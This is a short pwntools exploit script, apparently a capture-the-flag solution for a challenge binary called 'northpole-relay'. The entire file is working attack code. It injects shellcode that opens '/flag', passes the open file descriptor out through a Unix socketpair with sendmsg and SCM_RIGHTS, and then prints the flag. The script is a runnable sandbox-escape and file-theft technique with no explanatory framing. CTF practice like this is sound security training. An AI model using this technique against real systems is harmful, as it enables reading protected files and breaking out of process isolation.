#!/usr/bin/env python3

from pwn import *

context.binary = '/challenge/northpole-relay'

iovec = 'rsp'
cmsghdr = 'rsp + 0x10'
msghdr = 'rsp + 0x30'

payload = asm(f'''
{shellcraft.openat(file='/flag')}

mov qword ptr [{iovec}], rsp                    /* iov_base */
mov qword ptr [{iovec} + 0x8], 1                /* iov_len */

mov qword ptr [{cmsghdr}], 0x14                 /* cmsg_len */
mov dword ptr [{cmsghdr} + 0x8], SOL_SOCKET     /* cmsg_level */
mov dword ptr [{cmsghdr} + 0xc], SCM_RIGHTS     /* cmsg_type */
mov dword ptr [{cmsghdr} + 0x10], 4             /* flag fd */

mov qword ptr [{msghdr}], 0                     /* msg_name */
mov qword ptr [{msghdr} + 8], 0                 /* msg_namelen */
lea rax, [{iovec}]
mov qword ptr [{msghdr} + 0x10], rax            /* msg_iov */
mov qword ptr [{msghdr} + 0x18], 1              /* msg_iovlen */
lea rax, [{cmsghdr}]
mov qword ptr [{msghdr} + 0x20], rax            /* msg_control */
mov qword ptr [{msghdr} + 0x28], 0x14           /* msg_controllen */
mov qword ptr [{msghdr} + 0x30], 0              /* msg_flags */

lea rsi, [{msghdr}]
{shellcraft.sendmsg(3, 'rsi')}
{shellcraft.exit_group()}
''')

parent, child = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
os.dup2(child.fileno(), 3)

with process(close_fds=False) as p:
    p.sendlineafter(b'Loading incoming elf firmware packet...\n', payload)
    p.wait()

with os.fdopen(u32(parent.recvmsg(1, 0x18)[1][0][2])) as f:
    success(f'Flag: {f.read()}')
